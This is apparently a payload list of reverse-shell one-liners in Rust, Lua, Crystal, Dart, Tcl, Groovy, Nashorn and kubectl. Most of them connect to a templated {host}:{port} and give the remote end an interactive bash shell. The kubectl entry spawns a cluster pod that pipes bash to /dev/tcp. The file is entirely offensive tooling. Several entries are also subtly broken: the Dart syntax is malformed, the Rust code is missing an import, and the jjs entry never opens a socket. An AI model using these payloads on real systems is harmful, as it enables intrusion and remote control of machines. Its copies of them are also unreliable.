rust_inline_compile: rustc -o /tmp/rvol <(echo 'use std::net::TcpStream;use std::os::unix::io::AsRawFd;use std::process::Command;fn main(){if let Ok(s)=TcpStream::connect("{host}:{port}"){let fd=s.as_raw_fd();Command::new("/bin/bash").arg("-i").stdin(unsafe{std::process::Stdio::from_raw_fd(fd)}).stdout(unsafe{std::process::Stdio::from_raw_fd(fd)}).stderr(unsafe{std::process::Stdio::from_raw_fd(fd)}).status().unwrap();}}') && /tmp/rvol
lua_socket: lua -e 'local s=require("socket");local t=s.tcp();t:connect("{host}",{port});while true do local c=t:receive();if c then local f=io.popen(c.." 2>&1");local o=f:read("*a");t:send(o);end;end'
crystal_eval: crystal eval 'require "socket"; s = TCPSocket.new("{host}", {port}); p = Process.new("/bin/bash", ["-i"], input: s, output: s, error: s); p.wait'
dart_eval: dart eval 'import "dart:io"; main() async { var s = await Socket.connect("{host}", {port}); Process.start("/bin/bash", ["-i"].then((p) { s.pipe(p.stdin); p.stdout.pipe(s); p.stderr.pipe(s); }); }'
tclsh_eval: echo 'set s [socket {host} {port}];fileevent $s readable [list read $s];proc read {s} {if {[gets $s cmd] >= 0} {catch {exec $cmd} res;puts $s $res;flush $s} else {exit}};vwait forever' | tclsh
groovysh_eval: groovy -e 'String host="{host}";int port={port};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();'
jjs_nashorn_exec: echo 'var ProcessBuilder = Java.type("java.lang.ProcessBuilder"); var p = new ProcessBuilder("/bin/bash", "-i").inheritIO().start(); p.waitFor();' | jjs
kubectl: kubectl run rshell --rm -i --tty --image=alpine -- /bin/sh -c 'apk add --no-cache bash netcat-openbsd && bash -i >& /dev/tcp/{host}/{port} 0>&1'
